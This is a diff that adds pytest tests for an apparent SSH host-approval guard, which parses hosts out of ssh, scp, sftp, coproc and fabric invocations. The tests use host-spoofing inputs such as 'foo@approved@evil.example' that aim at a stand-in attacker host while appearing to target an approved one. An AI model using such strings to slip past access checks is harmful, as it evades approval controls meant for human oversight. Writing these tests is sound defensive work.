@@ -838,3 +838,35 @@ def test_wildcard_asyncssh_helpers_require_approval(module, call):
     assert _check_code_safety(code, session_id = "review") is not None
     approve_hosts("review", ["approved.example"])
     assert _check_code_safety(code, session_id = "review") is None
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "ssh -F none foo@approved@evil.example",
+        "scp -F none file foo@approved@evil.example:/file",
+        "sftp -F none foo@approved@evil.example",
+        "coproc ssh -F none evil.example",
+    ],
+)
+def test_ssh_real_target_requires_approval(command):
+    hosts, dynamic = extract_ssh_hosts_from_command(command)
+    assert hosts == {"evil.example"} and not dynamic
+    assert check_ssh_command_access(command, "review") is not None
+    approve_hosts("review", ["evil.example"])
+    assert check_ssh_command_access(command, "review") is None
+
+
+@pytest.mark.parametrize("command", ["echo coproc ssh evil.example", "coproc cat"])
+def test_coproc_keyword_does_not_create_spurious_ssh_targets(command):
+    assert extract_ssh_hosts_from_command(command) == (set(), False)
+
+
+def test_multiple_user_separators_do_not_hide_shell_expansion():
+    approve_hosts("review", ["approved.example"])
+    assert check_ssh_command_access("ssh -F none user@*@approved.example", "review") is not None
+
+
+def test_fabric_username_with_at_sign_uses_the_final_host():
+    code = "import fabric; fabric.Connection('user@domain@approved.example', config=fabric.Config(lazy=True))"
+    assert extract_ssh_hosts_from_python(code) == ({"approved.example"}, False, True)
